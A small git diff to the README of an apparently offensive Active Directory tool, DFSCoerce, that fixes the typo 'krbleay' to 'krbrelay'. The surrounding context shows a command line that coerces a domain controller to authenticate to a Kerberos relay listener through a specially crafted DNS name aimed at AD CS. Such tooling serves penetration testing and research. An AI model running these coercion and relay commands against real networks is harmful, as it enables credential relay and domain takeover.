@@ -27,7 +27,7 @@ DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
 # special command line switches:
 -listener: relay listener port
 -redirector: relay server/redirector  mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
-For detailed usage and command line switches refer to original krbleay tool
+For detailed usage and command line switches refer to original krbrelay tool
 ````
 
 <img width="1036" alt="Screenshot 2024-10-04 135731" src="https://github.com/user-attachments/assets/e2f95aa4-6c94-4517-b6c8-d7629a19a9f4">
